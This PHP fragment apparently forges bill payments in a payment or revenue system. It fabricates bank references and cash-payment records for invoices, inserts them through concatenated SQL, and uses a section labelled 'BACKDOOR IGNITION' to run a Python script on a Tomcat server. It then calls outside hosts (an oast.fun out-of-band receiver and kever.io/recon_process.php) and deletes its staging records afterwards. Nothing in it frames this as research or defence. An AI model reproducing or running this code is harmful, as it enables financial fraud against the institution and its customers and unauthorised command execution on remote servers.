                            $bty = explode('-', $bypass['invoice_no']);
                            $bty[1] = strtoupper($bty[1]);

                            $code2 = generateAccountNumber();
                            $code2Date = generateCurrentDateWithMidnightTime();

                            $data2 = array(
                                "apiKey" => "",
                                "type" => null,
                                "billNumber" => (string) $bypass['invoice_no'],
                                "billAmount" => number_format($bypassAmt, 1, '.', ''),
                                "phone" => "null",
                                "transactionDate" => (string) $code2Date,
                                "Field1" => null,
                                "Field2" => null,
                                "Field3" => null,
                                "Field4" => null,
                                "Field5" => null,
                                "bankdetails" => array(
                                    "accountNumber" => (string) $code2,
                                    "bankName" => "Equity Bank",
                                    "debitAccount" => (string) $bypass['invoice_no'],
                                    "debitCustName" => (string) $bypass['invoice_no'] . " " . strtoupper($validation['description']),
                                    "bankReference" => (string) $code2,
                                    "customerReference" => (string) $bypass['invoice_no'],
                                    "paymentMode" => "cash"
                                ),
                                "mpesadetails" => null
                            );

                            $obj2 = array(
                                "success" => true,
                                "description" => "Payment Received Successfuly",
                                "customer_no" => "NULL",
                                "invoice_no" => (string) $bypass['invoice_no'],
                                "invoice_report" => "",
                                "balance" => number_format($bypassAmt, 1, '.', '')
                            );



                            $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
                            $obj2 = json_encode($obj2, JSON_PRESERVE_ZERO_FRACTION);

                            //echo $data2 . '<br/><br/>';


                            $sqldata = trim(json_encode($data2), '"');
                            $sqlobj = trim(json_encode($obj2), '"');

                            $headers = [];

                            $bankTransactions = "INSERT INTO bankTransactions 
                            ( 
                            bankCode,  
                            transactionRef,  
                            amount,  
                            acctRefNo,  
                            accName,  
                            description,  
                            institutionCode,  
                            institutionName,  
                            status,  
                            logDate,  
                            transacDate,  
                            apiCode,  
                            mobileNumber,  
                            transtatus,  
                            billNumber,  
                            tranParticular,  
                            paymentMode,  
                            phoneNumber,  
                            requestoutput,  
                            paymentChannel,  
                            Currency,  
                            BranchCode,  
                            status_1,  
                            ValidationDate,  
                            PushedComments,  
                            transtatus_1
                            ) VALUES ( 
                            '003',  
                            '" . $code2 . "',  
                            " . $bypass['amount'] . ",  
                            '" . $bypass['invoice_no'] . "',  
                            null,  
                            null,  
                            '" . $bypass['invoice_no'] . "',  
                            '" . $validation['description'] . "',  
                            null,  
                            '" . $timeFormats['withSeparators'] . "',  
                            '" . $code2Date . "',  
                            '2f11db8526fb2e170219e4a68215a1b8fe907a6c',  
                            null,  
                            0,  
                            '" . $bypass['invoice_no'] . "',  
                            '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "',  
                            'cash',  
                            null,  
                            null,  
                            null,  
                            null,  
                            null,  
                            null,  
                            '" . $timeFormats['withSeparators'] . "',  
                            null,  
                            0 )";

                            echo 'Head: SQL query <br/>';
                            //$bankTransactions = "INSERT INTO bankTransactions (  bankCode, transactionRef, amount, acctRefNo, institutionCode, institutionName, logDate, transacDate, apiCode, mobileNumber, transtatus, billNumber, tranParticular, paymentMode, ValidationDate ) VALUES (  '003', '" . $code2 . "', " . $bypass['amount'] . ", '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . "', '" . $validation['description'] . "', '" . $timeFormats['withSeparators'] . "', '" . $code2Date . "', '2f11db8526fb2e170219e4a68215a1b8fe907a6c', null, 0, '" . $bypass['invoice_no'] . "', '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "', 'cash', '" . $timeFormats['withSeparators'] . "' )";

                            echo $bankTransactions . '<br/>' . base64_encode($data2). '<br/><br/>';
                            //echo $bankTransactions ;

                            //echo universal_dab($bankTransactions, 'bankTransactions') . '<br/><br/>';
                            //$mod = str_replace("GTTTG", $bankTransactions, base64_decode(ms_script()));

                            $mod = str_replace("XXBNXX", $bypass['invoice_no'], base64_decode(ms_script()));
                            $mod = str_replace("12345", $bypass['amount'], $mod);
                            $mod = str_replace("XXARXX", $bypass['invoice_no'], $mod);
                            $mod = str_replace("XXTRXX", $code2, $mod);
                            $mod = str_replace("XXTPXX", $bypass['invoice_no'] . " " . strtoupper($validation['description']), $mod);
                            $mod = str_replace("XXTDXX", $code2Date, $mod);
                            $mod = str_replace("'XXMNXX'", "null", $mod);
                            $mod = str_replace("XXICXX", $bypass['invoice_no'], $mod);
                            $mod = str_replace("XXACXX", "2f11db8526fb2e170219e4a68215a1b8fe907a6c", $mod);
                            $mod = str_replace("XXINXX", $validation['description'], $mod);
                            echo $mod;
                            die();

                            echo 'Head: Deepwood Insertion <br/>';
                            $base64_encoded_content = base64_encode($mod);
                            $stmt = $connDeep->prepare("INSERT INTO upgw (code) VALUES (:code)");
                            $stmt->bindParam(':code', $base64_encoded_content);
                            $stmt->execute();

                            $idDeep = $connDeep->lastInsertId();

                            echo json_encode(['id' => $idDeep]). '<br/><br/>';

                            ////////////////////////////// BACKDOOR IGNITION
                            $backdoor_res = cmd2();
                            $errCall = false;
                            //////////////////////////////////////////////////////
                            if (strpos($backdoor_res, 'java.lang.ClassCastException') !== false) {
                                // Word found
                                //*
                                $url = 'https://kever.io/recon_process.php';
                                $payload = ['payload' => base64_encode($data2)];
                                //echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
                                $recon = httpPost($url, $payload);
                                echo 'Head: Recon 1 Affrim <br/>';
                                echo $recon. '<br/><br/>';
                                //*/


                            } else {
                                $cmd = "python3 opt/tomcat/webapps/aggregate/master.py";
                                $receiver = 'https://qwnsltptvboodttriviyu0ocgxmp0z228.oast.fun';
                                $receiver = urlencode($receiver);

                                $backdoor_res2 = cmd($cmd, $receiver);

                                if (strpos($backdoor_res2, 'java.lang.ClassCastException') !== false) {
                                    // Word found
                                    //*
                                    $url = 'https://kever.io/recon_process.php';
                                    $payload = ['payload' => base64_encode($data2)];
                                    //echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
                                    $recon = httpPost($url, $payload);
                                    echo 'Head: Recon 2 Affrim <br/>';
                                echo $recon. '<br/><br/>';
                                    //*/


                                } else {
                                    $errCall = true;
                                }
                            }

                            if ($errCall) {
                                die('Command Lines Failed!!!');
                            } else {
                                echo 'Head: Deepwoods Clearance <br/>';
                                $stmt = $connDeep->prepare("SELECT * FROM upgw WHERE id=:id");
                                $stmt->execute(['id' => $idDeep]);
                                $result = $stmt->fetch();
                                echo base64_decode($result['result']) . '<br/><br/>';

                                $stmt = $connDeep->prepare("DELETE FROM upgw WHERE id=:id");
                                $stmt->execute(['id' => $idDeep]);

                                echo recLog($bypass['invoice_no'], $data2, $bankTransactions) . '<br/><br/>';
                            }



                            //echo bankTransactions_del(162618);
                            //echo transactions(8329712);
                        }
                    }
                }
            }
        }
    }
}
